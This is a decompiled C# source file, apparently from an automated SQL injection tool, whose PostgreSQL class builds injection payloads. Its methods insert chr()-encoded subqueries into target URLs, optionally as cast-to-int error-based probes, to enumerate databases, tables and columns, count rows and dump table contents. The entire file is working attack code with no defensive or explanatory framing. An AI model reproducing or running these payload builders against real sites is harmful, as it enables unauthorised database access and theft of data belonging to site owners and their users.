using System;
using System.Collections.Generic;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace DataBase
{
	// Token: 0x02000103 RID: 259
	public class PostgreSQL
	{
		// Token: 0x06001127 RID: 4391 RVA: 0x000773FC File Offset: 0x000755FC
		public static string Info(string sTraject, InjectionType oMethod, PostgreSQLErrorType bError, List<string> lColumn, string sEndUrl = "")
		{
			string text = Class23.smethod_21(Class54.string_0, false, "||", "chr");
			string str = Class23.smethod_21(Class54.string_2, false, "||", "chr");
			string text2 = text + "||#||" + text;
			if (bError != PostgreSQLErrorType.NONE)
			{
				if (bError == PostgreSQLErrorType.CAST_INT)
				{
					text2 = "cast((#) as int)".Replace("#", text2);
				}
			}
			else
			{
				text2 = "(" + text2 + ")";
			}
			checked
			{
				string text3;
				if (lColumn.Count == 1)
				{
					text3 = lColumn[0].Trim();
				}
				else
				{
					text3 = "";
					int num = lColumn.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						if (i > 0)
						{
							text3 = text3 + "||" + str + "||";
						}
						text3 += lColumn[i].Trim();
					}
					text3 = text3;
				}
				text2 = text2.Replace("#", text3);
				text2 = Class23.smethod_7(text2);
				return sTraject.Replace("[t]", text2) + sEndUrl;
			}
		}

		// Token: 0x06001128 RID: 4392 RVA: 0x0007751C File Offset: 0x0007571C
		public static string DataBases(string sTraject, InjectionType oMethod, PostgreSQLErrorType bError, bool bCorrentDB, int iOFFSET, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
		{
			string text = Class23.smethod_21(Class54.string_0, false, "||", "chr");
			Class23.smethod_21(Class54.string_2, false, "||", "chr");
			string text2 = text + "||#||" + text;
			if (bError != PostgreSQLErrorType.NONE)
			{
				if (bError == PostgreSQLErrorType.CAST_INT)
				{
					text2 = "cast((#) as int)".Replace("#", text2);
				}
			}
			else
			{
				text2 = "(" + text2 + ")";
			}
			if (bCorrentDB)
			{
				text2 = text2.Replace("#", "(select current_database())");
			}
			else
			{
				text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("(select distinct datname from pg_database where datname not like " + Class23.smethod_21("%postgres%", false, "||", "chr") + " and datname not like " + Class23.smethod_21("%template%", false, "||", "chr"), Interaction.IIf(!string.IsNullOrEmpty(sWhere), " and " + sWhere + " ", " ")), Interaction.IIf(!string.IsNullOrEmpty(sOrderBy), "order by " + sOrderBy + ", [datname] asc ", " ")), "limit 1 offset "), iOFFSET), ")")));
			}
			text2 = Class23.smethod_7(text2);
			return sTraject.Replace("[t]", text2) + sEndUrl;
		}

		// Token: 0x06001129 RID: 4393 RVA: 0x00077688 File Offset: 0x00075888
		public static string Tables(string sTraject, InjectionType oMethod, string sDataBase, PostgreSQLErrorType bError, int iOFFSET, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
		{
			string text = Class23.smethod_21(Class54.string_0, false, "||", "chr");
			Class23.smethod_21(Class54.string_2, false, "||", "chr");
			string text2 = text + "||#||" + text;
			if (bError != PostgreSQLErrorType.NONE)
			{
				if (bError == PostgreSQLErrorType.CAST_INT)
				{
					text2 = "cast((#) as int)".Replace("#", text2);
				}
			}
			else
			{
				text2 = "(" + text2 + ")";
			}
			text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
			{
				"(select distinct table_name from information_schema.tables where table_catalog=",
				Class23.smethod_21(sDataBase, false, "||", "chr"),
				" and table_type like chr(37)||chr(66)||chr(65)||chr(83)||chr(69)||chr(32)||chr(84)||chr(65)||chr(66)||chr(76)||chr(69)||chr(37) and table_name not like ",
				Class23.smethod_21("%pg_%", false, "||", "chr"),
				" and table_name not like ",
				Class23.smethod_21("%sql_%", false, "||", "chr")
			}), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), " limit 1 offset "), iOFFSET), ")")));
			text2 = Class23.smethod_7(text2);
			return sTraject.Replace("[t]", text2) + sEndUrl;
		}

		// Token: 0x0600112A RID: 4394 RVA: 0x000777D8 File Offset: 0x000759D8
		public static string Columns(string sTraject, InjectionType oMethod, string sDataBase, string sTable, PostgreSQLErrorType bError, int iOFFSET, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
		{
			string text = Class23.smethod_21(Class54.string_0, false, "||", "chr");
			Class23.smethod_21(Class54.string_2, false, "||", "chr");
			string text2 = text + "||#||" + text;
			if (bError != PostgreSQLErrorType.NONE)
			{
				if (bError == PostgreSQLErrorType.CAST_INT)
				{
					text2 = "cast((#) as int)".Replace("#", text2);
				}
			}
			else
			{
				text2 = "(" + text2 + ")";
			}
			text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("(select distinct column_name from information_schema.columns where table_catalog=" + Class23.smethod_21(sDataBase, false, "||", "chr") + " and table_name=" + Class23.smethod_21(sTable, false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), " limit 1 offset "), iOFFSET), ")")));
			text2 = Class23.smethod_7(text2);
			return sTraject.Replace("[t]", text2) + sEndUrl;
		}

		// Token: 0x0600112B RID: 4395 RVA: 0x000778F4 File Offset: 0x00075AF4
		public static string Dump(string sTraject, InjectionType oMethod, string sDataBase, string sTable, List<string> lColumn, PostgreSQLErrorType bError, int iOFFSET, string sWhere = "", string sOrderBy = "", string sEndUrl = "", string sCustomQuery = "")
		{
			string text = Class23.smethod_21(Class54.string_0, false, "||", "chr");
			string text2 = Class23.smethod_21(Class54.string_2, false, "||", "chr");
			string text3 = text + "||#||" + text;
			if (bError != PostgreSQLErrorType.NONE)
			{
				if (bError == PostgreSQLErrorType.CAST_INT)
				{
					text3 = "cast((#) as int)".Replace("#", text3);
				}
			}
			else
			{
				text3 = "(" + text3 + ")";
			}
			checked
			{
				if (!string.IsNullOrEmpty(sDataBase) & !string.IsNullOrEmpty(sTable))
				{
					string text4;
					if (lColumn.Count == 1)
					{
						text4 = "coalesce(#, chr(32))".Replace("#", "cast(# as text)".Replace("#", lColumn[0].Trim()));
					}
					else
					{
						text4 = "";
						int num = lColumn.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							if (i > 0)
							{
								text4 = text4 + "||" + text2 + "||";
							}
							text4 += "coalesce(#, chr(32))".Replace("#", "cast(# as text)".Replace("#", lColumn[i].Trim()));
						}
						text4 = text4;
					}
					text3 = text3.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("(select " + text4 + " from " + sTable, Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " order by " + sOrderBy)), " limit 1 offset "), iOFFSET), ")")));
				}
				else
				{
					text3 = text3.Replace("#", sCustomQuery);
					if (text3.Contains("[s]"))
					{
						text3 = text3.Replace("[s]", "||" + text2 + "||");
					}
					text3 = text3.Replace("[x]", Conversions.ToString(iOFFSET));
				}
				text3 = Class23.smethod_7(text3);
				return sTraject.Replace("[t]", text3) + sEndUrl;
			}
		}

		// Token: 0x0600112C RID: 4396 RVA: 0x00077B2C File Offset: 0x00075D2C
		public static string Count(string sTraject, InjectionType oMethod, PostgreSQLErrorType bError, Schema o, string sDataBase, string sTable, string sWhere = "", string sEndUrl = "")
		{
			string text = Class23.smethod_21(Class54.string_0, false, "||", "chr");
			Class23.smethod_21(Class54.string_2, false, "||", "chr");
			string text2 = text + "||#||" + text;
			if (bError != PostgreSQLErrorType.NONE)
			{
				if (bError == PostgreSQLErrorType.CAST_INT)
				{
					text2 = "cast((#) as int)".Replace("#", text2);
				}
			}
			else
			{
				text2 = "(" + text2 + ")";
			}
			switch (o)
			{
			case Schema.DATABASES:
				text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("(select count(*) from pg_database where datname not like " + Class23.smethod_21("%postgres%", false, "||", "chr") + " and datname not like " + Class23.smethod_21("%template%", false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")")));
				break;
			case Schema.TABLES:
				text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
				{
					"(select count(*) from information_schema.tables where table_catalog=",
					Class23.smethod_21(sDataBase, false, "||", "chr"),
					" and table_type like chr(37)||chr(66)||chr(65)||chr(83)||chr(69)||chr(32)||chr(84)||chr(65)||chr(66)||chr(76)||chr(69)||chr(37) and table_name not like ",
					Class23.smethod_21("%pg_%", false, "||", "chr"),
					" and table_name not like ",
					Class23.smethod_21("%sql_%", false, "||", "chr")
				}), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")")));
				break;
			case Schema.COLUMNS:
				text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("(select count(*) from information_schema.columns where table_catalog=" + Class23.smethod_21(sDataBase, false, "||", "chr") + " and table_name=" + Class23.smethod_21(sTable, false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")")));
				break;
			case Schema.ROWS:
				if (string.IsNullOrEmpty(sTable))
				{
					text2 = text2.Replace("#", "(" + sDataBase + ")");
				}
				else
				{
					text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("(select count(*) from " + sTable, Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")")));
				}
				break;
			}
			text2 = Class23.smethod_7(text2);
			return sTraject.Replace("[t]", text2) + sEndUrl;
		}

		// Token: 0x040008AB RID: 2219
		private static string string_0;

		// Token: 0x040008AC RID: 2220
		private static string string_1;

		// Token: 0x040008AD RID: 2221
		private static string string_2;
	}
}
